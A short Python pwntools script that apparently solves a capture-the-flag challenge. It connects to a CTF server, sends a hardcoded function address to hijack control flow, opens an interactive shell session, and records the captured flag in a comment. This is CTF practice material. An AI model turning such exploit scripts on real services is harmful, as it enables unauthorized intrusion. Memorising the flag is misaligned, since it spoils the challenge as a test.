from pwn import *

p = remote('recruit.osiris.bar', 50002)

print(p.recvuntil(b"?\n").decode())
deadbeef_addr = 0x80486c5
p.sendline(str(deadbeef_addr))

p.interactive()

# flag{hmm_mayb3_y0ull_lik3_s0m3_pwn1ng}
